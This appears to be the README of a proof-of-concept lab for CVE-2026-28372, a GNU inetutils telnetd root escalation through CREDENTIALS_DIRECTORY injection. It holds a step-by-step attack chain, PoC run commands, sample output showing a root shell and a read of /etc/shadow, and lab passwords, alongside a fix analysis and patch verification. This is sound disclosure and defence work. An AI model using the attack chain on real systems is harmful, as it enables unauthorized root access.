# CVE-2026-28372 - GNU inetutils telnetd Local Privilege Escalation via CREDENTIALS_DIRECTORY Injection

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field         | Value                                                |
|---------------|------------------------------------------------------|
| CVE           | CVE-2026-28372                                       |
| Component     | GNU inetutils `telnetd` (with util-linux `login(1)` interaction) |
| Type          | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| CVSS          | 7.4 (High) — `CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS          | N/A (not available at publication time)              |
| Affected      | GNU inetutils through 2.7 (inclusive), with util-linux >= 2.40 present |
| Fix           | Debian patch commit [`3953943d`](https://git.hadrons.org/cgit/debian/pkgs/inetutils.git/commit/?id=3953943d8296310485f98963883a798545ab9a6c) (`unsetenv("CREDENTIALS_DIRECTORY")`) |
| Author        | Exploit Intelligence Platform |
| Date          | 2026-02-27                                           |

## Vulnerability Details

GNU inetutils telnetd through version 2.7 allows **local privilege escalation to root** by exploiting the Telnet NEW_ENVIRON option (RFC 1572) to inject the `CREDENTIALS_DIRECTORY` environment variable into the `login(1)` process. When util-linux >= 2.40 is used as the system's login implementation, its systemd service credentials support reads `$CREDENTIALS_DIRECTORY/login.noauth` — if this file contains `yes`, **all authentication is bypassed**. An unprivileged local user can create this file, connect to telnetd, and obtain a root shell without knowing any password.

This vulnerability was reported by **Ron Ben Yizhak (SafeBreach)** and published on 2026-02-27. It requires **both** components to be present: GNU inetutils telnetd <= 2.7 **and** util-linux >= 2.40.

The vulnerability results from two interacting components:

**1. Insufficient Environment Variable Filtering in telnetd:** The Telnet NEW_ENVIRON option handler in `telnetd/state.c` calls `setenv(varp, valp, 1)` for each variable-value pair received from the client with **no validation**. Before launching `login(1)`, the `scrub_env()` function in `telnetd/pty.c` uses a **blacklist** that only removes `LD_*`, `_RLD_*`, `LIBPATH=`, and `IFS=` — a list designed in 1995 that has never been updated. The `CREDENTIALS_DIRECTORY` variable passes through unfiltered.

**2. systemd Credentials Support in util-linux login(1):** Starting with version 2.40, util-linux's `login(1)` supports systemd service credentials. It checks the `CREDENTIALS_DIRECTORY` environment variable for a file named `login.noauth`. If this file contains `yes`, login skips all authentication entirely — no password prompt, no PAM checks. This feature is intended for managed service environments where credentials are injected by systemd, not by untrusted clients.

The combination is lethal because telnetd invokes login with the `-p` flag (preserve environment), allowing the attacker-controlled `CREDENTIALS_DIRECTORY` to reach the login process.

### Attack Chain

```
1. Attacker creates /tmp/fake_cred/login.noauth containing "yes"
2. Attacker connects to local telnetd (port 23 or custom)
3. During Telnet NEW_ENVIRON negotiation, attacker injects:
   - CREDENTIALS_DIRECTORY=/tmp/fake_cred
   - USER=root
4. telnetd's scrub_env() blacklist does NOT filter CREDENTIALS_DIRECTORY
5. login(1) -p (preserve env) finds CREDENTIALS_DIRECTORY, reads login.noauth
6. login(1) skips all authentication → attacker gets root shell
```

### Fix (Commit 3953943d)

The upstream fix was authored by **Erik Auerswald** on 2026-02-15. It adds a single `unsetenv("CREDENTIALS_DIRECTORY")` call in `telnetd/pty.c` within `start_login()`, immediately before the `execv()` that launches `login(1)`:

```diff
--- a/telnetd/pty.c
+++ b/telnetd/pty.c
@@ -129,6 +129,14 @@ start_login (char *host, int autologin, char *name)
   if (!cmd)
     fatal (net, "can't expand login command line");
   argcv_get (cmd, "", &argc, &argv);
+
+  /* util-linux's "login" introduced an authentication bypass method
+   * via environment variable "CREDENTIALS_DIRECTORY" in version 2.40.
+   * Clear it from the environment before executing "login" to prevent
+   * abuse via Telnet.
+   */
+  unsetenv ("CREDENTIALS_DIRECTORY");
+
   execv (argv[0], argv);
   syslog (LOG_ERR, "%s: %m\n", cmd);
   fatalperror (net, cmd);
```

**Status:** Applied in Debian packaging (`3953943d`); not yet in the upstream Codeberg repository as of 2026-02-27.

**Assessment:** The fix is **effective** for the specific CVE-2026-28372 attack vector — removing `CREDENTIALS_DIRECTORY` before `execv()` prevents login(1) from finding the fake credential directory. However, the broader blacklist-based approach in `scrub_env()` remains fundamentally flawed. Other potentially dangerous variables (`BASH_ENV`, `ENV`, `HOME`, `PYTHONPATH`, etc.) are still passed through, and any future environment-variable-based feature in login or its child processes could introduce a similar vulnerability.

## Lab Setup

### Architecture

```
┌─────────────────────────────────────────────────────────┐
│  cve-2026-28372-vulnerable (debian:trixie)              │
│                                                         │
│  ┌──────────────┐    ┌───────────┐    ┌──────────────┐  │
│  │ mini-inetd   │───>│  telnetd  │───>│  login(1)    │  │
│  │ (Python3)    │    │  v2.7     │    │  util-linux  │  │
│  │ port 2323    │    │  (vuln)   │    │  v2.41       │  │
│  └──────────────┘    └───────────┘    └──────────────┘  │
│                                                         │
│  Users: root (Sup3rS3cretR00t!), weakuser (weakuser)   │
│  Credential dir: /home/weakuser/fake_cred/login.noauth  │
└─────────────────────────────────────────────────────────┘
```

The container builds telnetd from source at tag `v2.7` using a multi-stage Docker build. A lightweight Python `mini-inetd.py` script acts as an inetd replacement, listening on port 2323 and passing accepted connections to telnetd. The `login.noauth` file is pre-created at `/home/weakuser/fake_cred/login.noauth` to simulate the attacker's prerequisite.

### Quick Start

```bash
cd CVE-2026-28372

# Build and start
docker compose build
docker compose up -d

# Run the exploit PoC
python3 poc/poc.py localhost -p 2323

# Run the control test (proves auth is normally required)
python3 poc/control_test.py localhost 2323

# Cleanup
docker compose down
```

### Container Details

| Container                     | Role             | Base          | Host Port | Description                                         |
|-------------------------------|------------------|---------------|-----------|-----------------------------------------------------|
| `cve-2026-28372-vulnerable`   | Vulnerable target| Debian Trixie | `2323`    | GNU inetutils telnetd 2.7 with util-linux login 2.41|

### Default Credentials

| Service       | Username   | Password            |
|---------------|------------|---------------------|
| root (target) | `root`     | `Sup3rS3cretR00t!`  |
| local user    | `weakuser` | `weakuser`          |

## PoC Usage

The PoC script (`poc/poc.py`) is a standalone Python 3 tool with **no external dependencies** (stdlib only). It implements the full CVE-2026-28372 attack chain: connects to telnetd, performs Telnet option negotiation, injects `CREDENTIALS_DIRECTORY` and `USER=root` via the NEW_ENVIRON option, and verifies root shell access.

```bash
# Basic syntax
python3 poc/poc.py <host> -p <port>

# Run against the lab container
python3 poc/poc.py localhost -p 2323

# Verbose output (shows protocol negotiation)
python3 poc/poc.py localhost -p 2323 -v

# Custom credential directory and user
python3 poc/poc.py <host> -p <port> --cred-dir /tmp/fake_cred --user root
```

**Example output (vulnerable target):**

```
=================================================================
  CVE-2026-28372: GNU inetutils telnetd Privilege Escalation
  CREDENTIALS_DIRECTORY injection via Telnet NEW_ENVIRON
=================================================================

  Target:    localhost:2323
  Payload:   CREDENTIALS_DIRECTORY=/home/weakuser/fake_cred
  User:      root

[*] Connecting to localhost:2323...
[+] Connected to localhost:2323
[*] Performing Telnet option negotiation...
[+] INJECTED env vars via NEW_ENVIRON: CREDENTIALS_DIRECTORY=/home/weakuser/fake_cred USER=root
[*] Negotiation complete (4 rounds)
[*] Sending verification commands...

-----------------------------------------------------------------
  EXPLOIT RESULTS
-----------------------------------------------------------------
  id output:     uid=0(root) gid=0(root) groups=0(root)
  whoami output: root
  /etc/shadow:   root:$y$j9T$9rypIR8x3G7RIteftdbkD0$...
-----------------------------------------------------------------

[+] VULNERABILITY CONFIRMED — CVE-2026-28372
[+] Root shell obtained without password!

=================================================================
  [✓] EXPLOIT SUCCESSFUL — uid=0(root) confirmed
=================================================================
```

### Control Test — `poc/control_test.py`

Connects to telnetd **without** injecting `CREDENTIALS_DIRECTORY` to prove authentication is normally required.

```bash
python3 poc/control_test.py localhost 2323
```

**Expected output:**
```
[✓] CONTROL TEST PASSED — Authentication is required
    (login prompt received, proving the exploit is the causal factor)
```

## Verification: Vulnerable vs Patched

| Test                                    | Vulnerable (telnetd 2.7)                               | Patched (with `unsetenv("CREDENTIALS_DIRECTORY")`)       |
|-----------------------------------------|--------------------------------------------------------|----------------------------------------------------------|
| **Exploit PoC**                         | Root shell obtained (`uid=0(root)`) without password   | Login prompt shown; authentication required               |
| **Control (no exploit)**                | Login prompt shown; authentication required            | Login prompt shown; authentication required               |
| **`CREDENTIALS_DIRECTORY` in login env**| Present — passed to login(1)                           | Removed — `unsetenv()` strips it before `execv()`         |

### Evidence of Root Compromise (Vulnerable)

Three independent confirmations:
1. **`id`**: `uid=0(root) gid=0(root) groups=0(root)`
2. **`whoami`**: `root`
3. **`/etc/shadow` read**: Successfully read root's password hash — only possible as root

## Files

| File                        | Description                                                        |
|-----------------------------|--------------------------------------------------------------------|
| `poc/poc.py`                | Full CVE-2026-28372 exploit — zero dependencies, Python 3 stdlib only |
| `poc/control_test.py`       | Control test — proves authentication is normally required          |
| `Dockerfile.vulnerable`     | Multi-stage build: telnetd v2.7 on Debian Trixie                  |
| `docker-compose.yml`        | Container orchestration with healthcheck                           |
| `mini-inetd.py`             | Minimal inetd replacement for telnetd                              |
| `verify_lab.py`             | Automated lab verification script                                  |
| `intel_brief.md`            | CVE intelligence brief                                             |
| `vulnerability_analysis.md` | Root cause analysis                                                |
| `lab_build_report.md`       | Lab build documentation                                            |
| `poc_verification_report.md`| PoC test results                                                   |

## References

- [Original Bug Report](https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00000.html)
- [oss-security Disclosure](https://www.openwall.com/lists/oss-security/2026/02/24/1)
- [Debian Fix Commit 3953943d](https://git.hadrons.org/cgit/debian/pkgs/inetutils.git/commit/?id=3953943d8296310485f98963883a798545ab9a6c)
- [Follow-up Discussion](https://lists.gnu.org/archive/html/bug-inetutils/2026-02/msg00012.html)
- [Upstream Repository](https://codeberg.org/inetutils/inetutils)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-28372)

### Related CVEs

| CVE              | Description                                                                      |
|------------------|----------------------------------------------------------------------------------|
| CVE-2026-24061   | GNU inetutils telnetd remote auth bypass via `-f root` injection in USER variable|
| CVE-1999-0073    | telnet `LD_LIBRARY_PATH` injection — same root cause pattern, 27 years earlier   |

## Timeline

| Date       | Event                                           |
|------------|-------------------------------------------------|
| 2026-02-15 | Fix authored by Erik Auerswald                  |
| 2026-02-24 | Disclosure on oss-security mailing list         |
| 2026-02-27 | CVE-2026-28372 published                        |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-28372 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
